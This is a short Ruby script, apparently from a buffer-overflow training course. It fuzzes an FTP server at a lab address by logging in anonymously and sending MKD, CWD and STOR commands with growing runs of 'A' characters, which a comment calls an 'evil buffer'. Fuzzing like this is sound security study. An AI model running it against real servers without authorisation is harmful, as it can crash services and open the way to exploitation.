require 'socket'

buffers = %w(A)

#create an array of buffers from 20 to 2000 stepping by 20
#20.step(2000, 20) do |num|
#    buffers << ("A" * num)
#end

#they don't actually do the above in the videos or code, they step by 100
20.step(2000, 100) do |num|
    buffers << 'A' * num
end

#define our ftp commands
commands = %w(MKD CWD STOR)

#fuzz
commands.each do |cmd|
    buffers.each do |buffer|
        puts "Fuzzing #{cmd} with length #{buffer.length}"
        Socket.tcp('192.168.11.13', 21) do |s|
            s.recvfrom 1024
            s.sendmsg "USER ftp\r\n"  #login
            s.recvfrom 1024
            s.sendmsg "PASS ftp\r\n"
            s.recvfrom 1024
            
            s.sendmsg "#{cmd} #{buffer}\r\n" #evil buffer
            s.recvfrom 1024
            s.sendmsg "QUIT\r\n"
            s.close
        end
    end
end
